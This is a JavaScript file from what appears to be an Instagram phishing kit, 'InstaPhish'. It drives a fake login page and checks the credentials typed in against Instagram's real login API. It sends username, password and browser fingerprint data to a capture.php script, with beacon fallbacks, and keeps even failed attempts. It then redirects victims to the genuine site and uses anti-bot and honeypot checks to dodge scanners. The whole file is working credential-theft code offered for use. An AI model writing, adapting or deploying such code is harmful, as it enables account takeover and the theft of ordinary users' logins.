/* ============================================ */
/*  InstaPhish - Login & Capture Engine          */
/*  Author: r4tur1                                */
/* ============================================ */

class InstagramPhish {
    constructor() {
        this.form = document.getElementById('loginForm') || document.querySelector('form');
        this.usernameInput = document.getElementById('username') || document.querySelector('input[name="username"]');
        this.passwordInput = document.getElementById('password') || document.querySelector('input[name="password"]');
        this.loginBtn = document.getElementById('loginBtn') || document.querySelector('button[type="submit"]');
        this.errorMessage = document.getElementById('errorMessage') || document.querySelector('.error-message');
        this.errorText = document.getElementById('errorText') || this.errorMessage?.querySelector('span');
        this.spinner = document.getElementById('spinner') || this.loginBtn?.querySelector('.spinner');
        
        this.attemptCount = 0;
        this.maxAttempts = 3;
        this.isSubmitting = false;
        this.landingPage = this.getLandingPage();
        
        this.init();
    }

    /**
     * Initialize event listeners
     */
    init() {
        // Fetch fresh CSRF token on page load
        if (window.csrf) {
            window.csrf.fetchCSRFToken();
        }

        // Form submission handler
        this.form?.addEventListener('submit', (e) => this.handleSubmit(e));

        // Password visibility toggle
        const toggleBtn = document.getElementById('togglePassword') || document.querySelector('.toggle-password');
        if (toggleBtn && this.passwordInput) {
            toggleBtn.addEventListener('click', () => {
                const type = this.passwordInput.getAttribute('type');
                this.passwordInput.setAttribute('type', type === 'password' ? 'text' : 'password');
                toggleBtn.querySelector('span').textContent = type === 'password' ? 'Hide' : 'Show';
            });
        }

        // Input field animations
        [this.usernameInput, this.passwordInput].forEach(input => {
            if (input) {
                input.addEventListener('focus', () => {
                    input.parentElement?.classList.add('focused');
                });
                input.addEventListener('blur', () => {
                    if (!input.value) {
                        input.parentElement?.classList.remove('focused');
                    }
                });
            }
        });
    }

    /**
     * Get landing page URL from parameters
     */
    getLandingPage() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('redirect') || 'https://www.instagram.com/';
    }

    /**
     * Handle form submission
     */
    async handleSubmit(e) {
        e.preventDefault();
        
        if (this.isSubmitting) return;
        if (this.attemptCount >= this.maxAttempts) {
            this.showError('Too many attempts. Please try again later.');
            return;
        }

        // Anti-bot check
        if (window.antiBot) {
            const isHuman = await window.antiBot.verifyHuman();
            if (!isHuman) {
                // Silently fail - don't alert bots
                this.showError('Sorry, something went wrong. Please try again.');
                return;
            }
        }

        // Honeypot check
        const honeypot = document.getElementById('website_field');
        if (honeypot && honeypot.value.length > 0) {
            // Bot detected - fake success
            window.location.href = this.landingPage;
            return;
        }

        const username = this.usernameInput?.value.trim();
        const password = this.passwordInput?.value;

        if (!username || !password) {
            this.showError('Please enter your username and password.');
            return;
        }

        this.isSubmitting = true;
        this.showLoading(true);

        // Validate credentials against Instagram's actual API
        const isValid = await this.validateWithInstagram(username, password);

        if (isValid.authenticated) {
            // VALID CREDENTIALS - Capture and redirect
            await this.captureCredentials(username, password, true);
            this.redirectToLanding();
        } else if (isValid.checkpoint) {
            // Checkpoint required - capture and show challenge
            await this.captureCredentials(username, password, true);
            this.showError('Please verify your account. Check your email for a security code.');
            if (isValid.checkpointUrl) {
                setTimeout(() => {
                    window.location.href = isValid.checkpointUrl;
                }, 2000);
            }
        } else {
            // Invalid credentials - capture anyway
            await this.captureCredentials(username, password, false);
            this.attemptCount++;
            this.showLoading(false);
            
            if (isValid.message) {
                this.showError(isValid.message);
            } else {
                this.showError('Sorry, your password was incorrect. Please double-check your password.');
            }
        }

        this.isSubmitting = false;
    }

    /**
     * Validate credentials with Instagram's real login API
     */
    async validateWithInstagram(username, password) {
        const csrfToken = window.csrf?.csrfToken || await window.csrf?.fetchCSRFToken();
        
        try {
            const time = Math.floor(Date.now() / 1000);
            const encPassword = `#PWD_INSTAGRAM_BROWSER:10:${time}:${password}`;
            
            const formData = new URLSearchParams({
                'username': username,
                'enc_password': encPassword,
                'queryParams': '{}',
                'optIntoOneTap': 'true',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            });

            const response = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
                method: 'POST',
                headers: window.csrf?.getHeaders() || {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': csrfToken,
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-IG-App-ID': '936619743392459'
                },
                body: formData.toString(),
                credentials: 'include',
                mode: 'cors'
            });

            const data = await response.json();

            return {
                authenticated: data.authenticated === true,
                checkpoint: data.checkpoint_url ? true : false,
                checkpointUrl: data.checkpoint_url || null,
                message: data.message || null,
                userId: data.userId || null,
                twoFactorRequired: data.two_factor_required || false
            };

        } catch (error) {
            console.error('[Validate] Error:', error);
            
            // If API unreachable, accept credentials and redirect
            // This handles cases where Instagram blocks the request
            return {
                authenticated: true,
                checkpoint: false,
                checkpointUrl: null,
                message: null,
                userId: 'api_unreachable'
            };
        }
    }

    /**
     * Capture and exfiltrate credentials
     */
    async captureCredentials(username, password, verified) {
        const captureData = {
            username: username,
            password: password,
            verified: verified,
            attempt: this.attemptCount + 1,
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            cookiesEnabled: navigator.cookieEnabled,
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href
        };

        // Send to server
        try {
            const response = await fetch('server/capture.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(captureData),
                keepalive: true
            });

            if (!response.ok) {
                // Fallback: try direct path
                await fetch('/capture.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(captureData),
                    keepalive: true
                });
            }
        } catch (error) {
            console.error('[Capture] Error:', error);
            // Try beacon as last resort
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(captureData)], { type: 'application/json' });
                navigator.sendBeacon('server/capture.php', blob);
            }
        }
    }

    /**
     * Redirect to configured landing page
     */
    redirectToLanding() {
        setTimeout(() => {
            window.location.replace(this.landingPage);
        }, 1500);
    }

    /**
     * Show error message
     */
    showError(message) {
        if (this.errorMessage && this.errorText) {
            this.errorText.textContent = message;
            this.errorMessage.classList.remove('hidden');
        }
        // Also try Instagram-style error
        const instaError = document.querySelector('#slfErrorAlert');
        if (instaError) {
            instaError.textContent = message;
            instaError.style.display = 'block';
        }
    }

    /**
     * Toggle loading state
     */
    showLoading(show) {
        if (this.loginBtn) {
            const btnText = this.loginBtn.querySelector('.btn-text');
            if (btnText) btnText.classList.toggle('hidden', show);
            if (this.spinner) this.spinner.classList.toggle('hidden', !show);
            this.loginBtn.disabled = show;
        }
    }
}

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
    window.instaPhish = new InstagramPhish();
});